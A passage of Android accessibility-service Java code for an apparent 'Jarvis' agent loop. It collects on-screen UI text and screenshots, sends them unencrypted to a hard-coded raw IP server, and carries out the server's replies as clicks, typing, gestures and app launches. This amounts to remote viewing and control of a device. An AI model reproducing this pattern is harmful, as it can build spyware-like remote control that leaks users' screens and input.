            String nodeId = "node_" + java.util.UUID.randomUUID().toString().substring(0, 8);
            nodeMap.put(nodeId, node);
            try {
                org.json.JSONObject obj = new org.json.JSONObject();
                obj.put("id", nodeId);
                obj.put("text", nodeText.length() > 80 ? nodeText.substring(0, 80) : nodeText);
                if (isClickable) obj.put("clickable", true);
                if (isEditable) obj.put("editable", true);
                nodeArray.put(obj);
            } catch (Exception e) {}
            return;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            traverseNodeTree(node.getChild(i), nodeArray);
        }
    }

    private String gatherChildText(AccessibilityNodeInfo node, int maxDepth) {
        if (node == null || maxDepth <= 0) return "";
        StringBuilder sb = new StringBuilder();
        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();
        if (text != null && text.length() > 0) sb.append(text.toString().trim()).append(" ");
        if (desc != null && desc.length() > 0) sb.append(desc.toString().trim()).append(" ");
        for (int i = 0; i < node.getChildCount(); i++) {
            sb.append(gatherChildText(node.getChild(i), maxDepth - 1));
        }
        return sb.toString();
    }

    private void sendPayloadToServer(org.json.JSONArray nodeArray, String command, String base64Image) {
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL("http://77.105.133.37:3030/api/jarvis/command");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                org.json.JSONObject jsonBody = new org.json.JSONObject();
                jsonBody.put("uiNodes", nodeArray);
                jsonBody.put("command", command);
                jsonBody.put("sessionId", currentSessionId);
                if (base64Image != null) {
                    jsonBody.put("screenshot", base64Image);
                }

                try (java.io.OutputStream os = conn.getOutputStream()) {
                    byte[] input = jsonBody.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                }

                if (conn.getResponseCode() == 200) {
                    try (java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream(), "utf-8"))) {
                        StringBuilder response = new StringBuilder();
                        String responseLine;
                        while ((responseLine = br.readLine()) != null) response.append(responseLine.trim());

                        org.json.JSONObject responseJson = new org.json.JSONObject(response.toString());
                        String action = responseJson.optString("action", "done");
                        String nodeId = responseJson.optString("node_id", "");

                        android.util.Log.d(TAG, "[AgentLoop] Action: " + action + " Node: " + nodeId);

                        if (action.equals("home")) {
                            performGlobalAction(GLOBAL_ACTION_HOME);
                            handler.postDelayed(() -> continueAgentLoop(""), 1500);
                        } else if (action.equals("launch_app")) {
                            String appName = responseJson.optString("text", "");
                            if (!appName.isEmpty()) launchAppByName(appName);
                            handler.postDelayed(() -> continueAgentLoop(""), 2500);
                        } else if (action.equals("scroll_forward")) {
                            AccessibilityNodeInfo targetNode = nodeMap.get(nodeId);
                            if (targetNode != null) targetNode.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
                            handler.postDelayed(() -> continueAgentLoop(""), 1500);
                        } else if (action.equals("scroll_backward")) {
                            AccessibilityNodeInfo targetNode = nodeMap.get(nodeId);
                            if (targetNode != null) targetNode.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD);
                            handler.postDelayed(() -> continueAgentLoop(""), 1500);
                        } else if (action.equals("click")) {
                            AccessibilityNodeInfo targetNode = nodeMap.get(nodeId);
                            if (targetNode != null) {
                                boolean clicked = targetNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                if (!clicked) {
                                    android.util.Log.d(TAG, "[AgentLoop] ACTION_CLICK failed, falling back to coordinate tap.");
                                    android.graphics.Rect bounds = new android.graphics.Rect();
                                    targetNode.getBoundsInScreen(bounds);
                                    android.util.DisplayMetrics metrics = getResources().getDisplayMetrics();
                                    float x = bounds.centerX() / (float) metrics.widthPixels;
                                    float y = bounds.centerY() / (float) metrics.heightPixels;
                                    dispatchGroqGesture(x, y);
                                    return;
                                }
                            }
                            handler.postDelayed(() -> continueAgentLoop(""), 1500);
                        } else if (action.equals("type_text")) {
                            AccessibilityNodeInfo targetNode = nodeMap.get(nodeId);
                            if (targetNode != null) {
                                String textToType = responseJson.optString("text", "");
                                android.os.Bundle arguments = new android.os.Bundle();
                                arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, textToType);
                                boolean typed = targetNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                                if (!typed) {
                                    android.util.Log.d(TAG, "[AgentLoop] ACTION_SET_TEXT failed, falling back to coordinate tap.");
                                    android.graphics.Rect bounds = new android.graphics.Rect();
                                    targetNode.getBoundsInScreen(bounds);
                                    android.util.DisplayMetrics metrics = getResources().getDisplayMetrics();
                                    float x = bounds.centerX() / (float) metrics.widthPixels;
                                    float y = bounds.centerY() / (float) metrics.heightPixels;
                                    dispatchGroqGesture(x, y);
                                    return;
                                }
                            }
                            handler.postDelayed(() -> continueAgentLoop(""), 1500);
                        } else if (action.equals("dispatch_gesture")) {
                            float x = (float) responseJson.optDouble("x", 0.5);
                            float y = (float) responseJson.optDouble("y", 0.5);
                            dispatchGroqGesture(x, y);
                        } else if (action.equals("done")) {
                            currentSessionId = "";
                            isVisionLoopRunning.set(false);
                            android.util.Log.d(TAG, "[AgentLoop] Loop Finished!");
                        } else {
                            handler.postDelayed(() -> continueAgentLoop(""), 1500);
                        }
                    }
                }
            } catch (Exception e) {
                android.util.Log.e(TAG, "[AgentLoop] Error in server request", e);
                isVisionLoopRunning.set(false);
            }
        }).start();
    }

    // -------------------------------------------------------------
    // GESTURE INJECTION
    // -------------------------------------------------------------

    public void performRemoteTap(float x, float y) {
        lastAtsTime = System.currentTimeMillis();
        android.util.DisplayMetrics metrics = getResources().getDisplayMetrics();
        float absoluteX = x * metrics.widthPixels;
        float absoluteY = y * metrics.heightPixels;

        android.util.Log.d(TAG, "Dispatching Remote XY Tap to Absolute X:" + absoluteX + " Y:" + absoluteY);

        Path path = new Path();
        path.moveTo(absoluteX, absoluteY);
        path.lineTo(absoluteX, absoluteY);

        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 150, false);
        GestureDescription gesture = new GestureDescription.Builder().addStroke(stroke).build();

        dispatchGesture(gesture, null, null);
    }

    public void dispatchGroqGesture(float x, float y) {
        android.util.DisplayMetrics metrics = getResources().getDisplayMetrics();
        float absoluteX = x * metrics.widthPixels;
        float absoluteY = y * metrics.heightPixels;

        android.util.Log.d(TAG, "Dispatching Jarvis Gesture to Absolute X:" + absoluteX + " Y:" + absoluteY);

        Path path = new Path();
        path.moveTo(absoluteX, absoluteY);
        path.lineTo(absoluteX, absoluteY);

        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 150, false);
        GestureDescription gesture = new GestureDescription.Builder().addStroke(stroke).build();

        boolean dispatched = dispatchGesture(gesture, new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                android.util.Log.d(TAG, "Jarvis Gesture COMPLETED successfully!");
                if (!currentSessionId.isEmpty()) {
                    handler.postDelayed(() -> continueAgentLoop(""), 1500);
                }
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                android.util.Log.d(TAG, "Jarvis Gesture CANCELLED!");
                if (!currentSessionId.isEmpty()) {
                    handler.postDelayed(() -> continueAgentLoop(""), 1500);
                }
            }
        }, null);
    }

    // -------------------------------------------------------------
    // SCREENSHOT CAPTURE
    // -------------------------------------------------------------

    public void captureLatestFrameBase64(Consumer<String> callback) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, Executors.newSingleThreadExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    HardwareBuffer hardwareBuffer = screenshotResult.getHardwareBuffer();
                    ColorSpace colorSpace = screenshotResult.getColorSpace();
                    Bitmap hwBitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace);
                    if (hwBitmap != null) {
                        Bitmap swBitmap = hwBitmap.copy(Bitmap.Config.ARGB_8888, false);
                        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                        swBitmap.compress(Bitmap.CompressFormat.JPEG, 60, byteArrayOutputStream);
                        byte[] byteArray = byteArrayOutputStream.toByteArray();
                        String base64Image = Base64.encodeToString(byteArray, Base64.NO_WRAP);
                        callback.accept(base64Image);
                        swBitmap.recycle();
                        hwBitmap.recycle();
                    } else {
                        callback.accept(null);
                    }
                    hardwareBuffer.close();
                }

                @Override
                public void onFailure(int errorCode) {
                    Timber.tag(TAG).e("takeScreenshot failed with error code: " + errorCode);
                    callback.accept(null);
                }
            });
        } else {
            Timber.tag(TAG).e("takeScreenshot is only available on API 30+");
            callback.accept(null);
        }
    }

    // -------------------------------------------------------------
    // PINCH ZOOM GESTURE BUILDERS
    // -------------------------------------------------------------

    private GestureDescription.Builder createPinchGesture(Intent intent) {
        float[] eventCoords = intent.getFloatArrayExtra(EVENT_BYTES_TAG);

        float x = eventCoords[0];
        float y = eventCoords[1];
        float sgn = eventCoords[2];
        float len = (sgn > 0) ? eventCoords[4] * zoomScale : 30;
        long d1 = (sgn > 0) ? 400 : 600;
        long d2 = 200;

        float[] ep = findEndpts(x, y, len);
        float xp = ep[0], yp = ep[1], xq = ep[2], yq = ep[3];
        Timber.d("From (%f,%f) to (%f,%f) and (%f,%f)", x, y, xp, yp, xq, yq);

        Path p = new Path();
        Path p2 = new Path();
        Path q = new Path();
        Path q2 = new Path();
        if (sgn > 0) {
            Timber.d("Zoom in");
            p.moveTo(x, y);
            p.lineTo(xp, yp);
            q.moveTo(x, y);
            q.lineTo(xq, yq);

            float mag = (float) Math.sqrt(Math.pow(xp - x, 2) + Math.pow(yp - y, 2));
            p2.moveTo(xp, yp);
            p2.lineTo((xp - x) / mag + xp, (yp - y) / mag + yp);
            mag = (float) Math.sqrt(Math.pow(xq - x, 2) + Math.pow(yq - y, 2));
            q2.moveTo(xq, yq);
            q2.lineTo((xq - x) / mag + xq, (yq - y) / mag + yq);

        } else {
            Timber.d("Zoom out");
            p.moveTo(xp, yp);
            p.lineTo(x + 1, y + 1);
            q.moveTo(xq, yq);
            q.lineTo(x, y);

            float mag = (float) Math.sqrt(Math.pow(xp - x, 2) + Math.pow(yp - y, 2));
            p2.moveTo(x, y);
            p2.lineTo((x - xp) / mag + x + 1, (y - yp) / mag + y + 1);
            mag = (float) Math.sqrt(Math.pow(xq - x, 2) + Math.pow(yq - y, 2));
            q2.moveTo(x, y);
            q2.lineTo((x - xq) / mag + x, (y - yq) / mag + y);
        }

        GestureDescription.Builder gb = new GestureDescription.Builder();
        GestureDescription.StrokeDescription stroke1 = new GestureDescription.StrokeDescription(p, 0, 400, true);
        stroke1.continueStroke(p2, 400, 200, false);
        GestureDescription.StrokeDescription stroke2 = new GestureDescription.StrokeDescription(q, 0, 400, true);
        stroke2.continueStroke(q2, 400, 200, false);

        gb.addStroke(stroke1);
        gb.addStroke(stroke2);

        return gb;
    }

    private float[] findEndpts(float x, float y, float len) {
        float xm = APP_SCREEN_PIXELS_WIDTH;
        float ym = FULL_SCREEN_PIXELS_HEIGHT;

        float xr = x / xm, yr = y / ym;

        float bestDist = 0;
        float[] ep = new float[4];

        float x1 = 0, y1 = 0;
        float x2, y2;
        if (xr > yr) {
            y2 = yRightSide(x1, y1, x, y, xm);
            x2 = xm;
        } else {
            x2 = xBottomSide(x1, y1, x, y, ym);
            y2 = ym;
        }
        float minDist = minLength(x, y, x1, y1, x2, y2);
        if (minDist > bestDist) {
            bestDist = minDist;
            ep = new float[]{x1, y1, x2, y2};
        }

        x1 = xm;
        y1 = 0;
        if (yr > 1 - xr) {
            x2 = xBottomSide(x1, y1, x, y, ym);
            y2 = ym;
        } else {
            x2 = 0;
            y2 = yLeftSide(x1, y1, x, y);
        }
        minDist = minLength(x, y, x1, y1, x2, y2);
        if (minDist > bestDist) {
            bestDist = minDist;
            ep = new float[]{x1, y1, x2, y2};
        }

        x1 = 0;
        y1 = ym;
        if (yr > 1 - xr) {
            x2 = xm;
            y2 = yRightSide(x1, y1, x, y, xm);
        } else {
            x2 = xTopSide(x1, y1, x, y);
            y2 = 0;
        }
        minDist = minLength(x, y, x1, y1, x2, y2);
        if (minDist > bestDist) {
            bestDist = minDist;
            ep = new float[]{x1, y1, x2, y2};
        }

        x1 = xm;
        y1 = ym;
        if (xr > yr) {
            x2 = xTopSide(x1, y1, x, y);
            y2 = 0;
        } else {
            x2 = 0;
            y2 = yLeftSide(x1, y1, x, y);
        }
        minDist = minLength(x, y, x1, y1, x2, y2);

        return ep;
    }

    private float yRightSide(float x0, float y0, float x, float y, float xm) {
        float l = (xm - x) / (x - x0);
        return y + l * (y - y0);
    }

    private float yLeftSide(float x0, float y0, float x, float y) {
        float l = -x / (x - x0);
        return y + l * (y - y0);
    }

    private float xTopSide(float x0, float y0, float x, float y) {
        float l = -y / (y - y0);
        return x + l * (x - x0);
    }

    private float xBottomSide(float x0, float y0, float x, float y, float ym) {
        float l = (ym - y) / (y - y0);
        return x + l * (x - x0);
    }

    private float minLength(float x, float y, float x1, float y1, float x2, float y2) {
        float dist1 = (float) Math.sqrt((x - x1) * (x - x1) + (y - y1) * (y - y1));
        float dist2 = (float) Math.sqrt((x - x2) * (x - x2) + (y - y2) * (y - y2));
        return Math.min(dist1, dist2);
    }

    private GestureDescription.Builder createGeneralGesture(Intent intent) {
        float[] eventCoords = intent.getFloatArrayExtra(EVENT_BYTES_TAG);
        if (eventCoords == null || eventCoords.length < 3) return null;

        long dt = (long) eventCoords[eventCoords.length - 1];
        dt = (dt > 0) ? dt : 150;

        Path path = new Path();
        path.moveTo(eventCoords[0], eventCoords[1]);

        for (int i = 2; i < eventCoords.length - 1; i += 2) {
            path.lineTo(eventCoords[i], eventCoords[i + 1]);
        }

        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, dt, false);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        return builder;
    }

    private void tryDispatchGesture(GestureDescription.Builder builder) {
        if (builder == null) return;
        if (gestureQ.isEmpty())
            dispatchGesture(builder);
        else
            gestureQ.addFirst(builder);
    }

    private void dispatchGesture(GestureDescription.Builder builder) {
        boolean result = dispatchGesture(builder.build(), new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                super.onCompleted(gestureDescription);
                Timber.tag("dispatchGesture onCompleted").d(String.valueOf(gestureDescription));
                if (!gestureQ.isEmpty()) {
                    GestureDescription.Builder b = gestureQ.pollLast();
                    if (b != null)
                        dispatchGesture(b);
                }
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
                Timber.tag("dispatchGesture onCancelled").d(String.valueOf(gestureDescription));
            }
        }, null);
        Timber.tag(TAG).d("Gesture dispatched, result=%s", result);
    }

    // -------------------------------------------------------------
    // APP LAUNCHER
    // -------------------------------------------------------------

    private void launchAppByName(String appName) {
        if (appName == null || appName.trim().isEmpty()) return;
        android.content.pm.PackageManager pm = getPackageManager();
        java.util.List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA);

        String bestMatchPackage = null;
        for (android.content.pm.ApplicationInfo app : apps) {
            CharSequence labelSeq = pm.getApplicationLabel(app);
            if (labelSeq != null) {
                String label = labelSeq.toString().toLowerCase().trim();
                String target = appName.toLowerCase().trim();
                if (label.equals(target)) {
                    bestMatchPackage = app.packageName;
                    break;
                } else if (label.contains(target)) {
                    bestMatchPackage = app.packageName;
                }
            }
        }

        if (bestMatchPackage != null) {
            android.content.Intent launchIntent = pm.getLaunchIntentForPackage(bestMatchPackage);
            if (launchIntent != null) {
                launchIntent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(launchIntent);
                android.util.Log.d(TAG, "[AgentLoop] Launched app: " + appName + " (" + bestMatchPackage + ")");
            }
        }
    }
}